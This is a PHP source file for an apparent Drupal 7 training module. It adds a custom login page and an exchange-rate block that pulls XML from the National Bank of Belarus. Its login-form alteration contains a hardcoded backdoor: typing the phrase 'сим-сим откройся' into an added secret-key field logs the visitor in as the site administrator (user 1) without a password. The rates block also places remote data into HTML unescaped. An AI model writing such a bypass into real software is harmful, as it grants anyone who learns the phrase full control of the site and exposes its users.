<?php

/**
 * Implements hook_menu().
 *
 * @return mixed
 */
function training2_menu(){

  $menu['login_form'] = array(
    'title' => 'New Login Form',
    'page callback' => 'training2_new_login_page',
    'access callback' => TRUE,
    'type' => MENU_NORMAL_ITEM,
    'variables' => array(
      'intro_text' => NULL,
      'form' => NULL,
    ),
  );

  return $menu;
}

/**
 * Page callback from training2_menu()
 *
 * @return string
 */
function training2_new_login_page(){
  $form = drupal_get_form('user_login');
  return drupal_render($form);
}

/**
 * Implements hook_theme().
 *
 * @return mixed
 */
function training2_theme(){
  $items['user_login'] = array(
    'render element' => 'form',
    'template' => 'templates/training2_user_login_template',
  );
  return $items;
}

/**
 * Implements hook_form_alter().
 *
 * @param $form
 * @param $form_state
 * @param $form_id
 */
function training2_form_user_login_alter(&$form, &$form_state,$form_id){
  $form['secret_key'] = array(
    '#type' => 'textfield',
    '#title' => 'Секретный ключ',
  );
  $form['name']['#required'] = FALSE;
  $form['pass']['#required'] = FALSE;
  unset($form['#validate']);
  unset($form['#submit']);
  $form['#validate'][] = 'new_login_validate';
  $form['#submit'][] = 'new_login_submit';
}

/**
 * Validation function for altered user-login form in training2 module
 *
 * @param $form
 * @param $form_state
 */
function new_login_validate(&$form,&$form_state){
  if (!$form_state['input']['secret_key']){
    user_login_name_validate($form, $form_state);
    user_login_authenticate_validate($form, $form_state);
    user_login_final_validate($form, $form_state);
  }
  elseif ($form_state['input']['secret_key'] != 'сим-сим откройся'){
    form_set_error('text',t('You shall not pass!!! Secret key is wrong!!!'));
  }
}

/**
 * Submit function for altered user-login form in training2 module
 *
 * @param $form
 * @param $form_state
 */
function new_login_submit(&$form, &$form_state){

  if ($form_state['input']['secret_key'] == 'сим-сим откройся'){
    drupal_set_message(t('You are logged in as admin by secret key.'));
    global $user;
    $user = user_load(1);
    $form_state['redirect'] = 'user/' . $user->uid;
    user_login_finalize($form_state);
  }
  else {
    drupal_set_message(t('You are logged in.'));
    user_login_submit($form, $form_state);
  }
}

/**
 * Implements hook_block_info().
 *
 * @return mixed
 */
function training2_block_info() {
  $blocks['exchange'] = array(
    'info' => t('Exchange'),
    'region' => 'sidebar_first',
    'cache' => DRUPAL_CACHE_GLOBAL,
  );

  return $blocks;
}

/**
 * Implements hook_block_view().
 *
 * @param string $delta
 * @return mixed
 */
function training2_block_view($delta = '') {

  if ($delta == 'exchange') {
    $block['subject'] = t('Exchange rates');
    $block['content'] = training_block_contents($delta);
    return $block;
  }
}

/**
 * Custom function to get xml document by url
 *
 * @param $url
 * @return \SimpleXMLElement
 */
function training2_get_remote_xml($url){

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $xmlresponse = curl_exec($ch);
  $data=simplexml_load_string($xmlresponse);

  return $data;
}

/**
 * Implements hook_block_contents().
 *
 * @param string $delta
 * @return string
 */
function training_block_contents($delta = ''){

  if ($delta == 'exchange') {

    $update = variable_get('exchange_rates_update_time');
    //Rates are updated once a day (86400 seconds)
    if (!$update or (time() - $update) >= 86400){
      $update = time();
      $currencies = training2_get_remote_xml('http://www.nbrb.by/Services/XmlExRatesRef.aspx');
      $rates = training2_get_remote_xml('http://www.nbrb.by/Services/XmlExRates.aspx');

      //Here we get an array from rates of only traded currencies
      foreach($rates->Currency as $currency) {
        $code = $currency->CharCode;
        $rate = $currency->Rate;
        $traded_cur_rates["$code"] = "$rate";
      }

      //Here we get an array of rates of all the currencies
      //(rate = 'no data' for non-traded)
      //also here we add new currencies to the list (as disabled)
      $currencies_to_display = variable_get('currencies_to_display',NULL);
      foreach ($currencies->Currency as $currency){
        $code = $currency->CharCode;
        if (!isset($currencies_to_display["$code"])){
          $currencies_to_display["$code"] = 0;
        }
        //Check if the currency is traded
        if (array_key_exists("$code",$traded_cur_rates)){
          $exchange_rates["$code"] = $traded_cur_rates["$code"];
         }
        else{
          $exchange_rates["$code"] = 'no data';
        }
      }

      variable_set('currencies_to_display',$currencies_to_display);
      variable_set('exchange_rates',$exchange_rates);
      variable_set('exchange_rates_update_time',$update);
    }
    else{
      $exchange_rates =  variable_get('exchange_rates');
      $currencies_to_display = variable_get('currencies_to_display');
    }

    $content = '<table>';
    foreach ($currencies_to_display as $code => $display){
      if ($display){
        $content .= '<tr><td>' . $code . '</td>' .
          '<td>' . $exchange_rates["$code"] . '</td></tr>';
      }
    }
    $content .= '</table>';
    $content .= '<br>' . t('Update time:') . '<br>' . date('d-m-Y H:i:s',$update);

    return $content;
  }

  return;
}

/**
 * Implements hook_block_configure().
 *
 * @param string $delta
 * @return mixed
 */
function training2_block_configure($delta = ''){
  if ($delta == 'exchange'){
    $currencies_to_display = variable_get('currencies_to_display');
    $currencies_to_conf = array_keys($currencies_to_display);
    $currencies_to_conf = drupal_map_assoc($currencies_to_conf);

    $form['currencies_to_display'] = array(
      '#type' => 'checkboxes',
      '#options' => $currencies_to_conf,
      '#title' => t('Currencies to display in Exchange rates block'),
      '#default_value' => $currencies_to_display,
    );
  }

  return $form;
}

/**
 * Implements hook_block_save().
 *
 * @param string $delta
 * @param array $edit
 */
function training2_block_save($delta='', $edit = array()) {
  if ($delta == 'exchange') {
    variable_set('currencies_to_display', $edit['currencies_to_display']);
  }
}
